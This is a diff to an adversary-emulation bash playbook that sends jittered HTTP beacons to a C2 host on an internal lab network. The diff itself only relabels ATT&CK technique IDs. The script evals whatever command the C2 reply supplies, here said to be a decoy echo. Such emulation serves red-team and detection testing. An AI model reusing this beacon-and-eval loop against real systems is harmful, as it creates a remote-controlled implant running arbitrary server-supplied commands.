@@ -10,8 +10,8 @@
 # no-op decoy task. All traffic stays on the environment's internal `northline-net` bridge.
 #
 #   periodic jittered beacon        C2 over web protocol      (T1071.001)
-#   custom beacon interval/jitter   Non-standard/custom C2 behaviour (T1573, T1008)
-#   fetch + run decoy task          Execution via C2 channel   (T1059 / T1105)
+#   custom beacon interval/jitter   Application Layer Protocol: Web Protocols (T1071.001)
+#   fetch + run decoy task          Execution via C2 channel   (T1059)
 #
 # Usage: BEACON_COUNT=10 bash playbooks/run-c2-beacon.sh
 # ---------------------------------------------------------------------------
@@ -35,14 +35,14 @@ say "Northline :: C2 beacon emulation :: session=$SESSION"
 say "target=${C2_HOST}:${C2_PORT} beacons=${BEACON_COUNT}"
 say "$(st_banner)"
 
-step "C2 beaconing with jittered interval (ATT&CK T1071.001, T1573)"
+step "C2 beaconing with jittered interval (ATT&CK T1071.001)"
 for i in $(seq 1 "$BEACON_COUNT"); do
     st_mark T1071.001 "beacon-$i"
     ST_UA="$UA" RESP="$(st_http GET "http://${C2_HOST}:${C2_PORT}/beacon?i=${i}&session=${SESSION}")"
     say "beacon #$i -> $RESP"
 
     if echo "$RESP" | grep -q 'echo decoy-task-executed'; then
-        step "executing decoy task returned by C2 (ATT&CK T1059/T1105)"
+        step "executing decoy task returned by C2 (ATT&CK T1059)"
         act T1059 "eval C2-supplied task (echo decoy-task-executed)" "$LAB_NODE" "task decoy-task-0001"
         OUT="$(eval "$(echo "$RESP" | python3 -c 'import sys,json; print(json.load(sys.stdin)["task"]["command"])' 2>/dev/null)" 2>&1)"
         say "task output: $OUT"
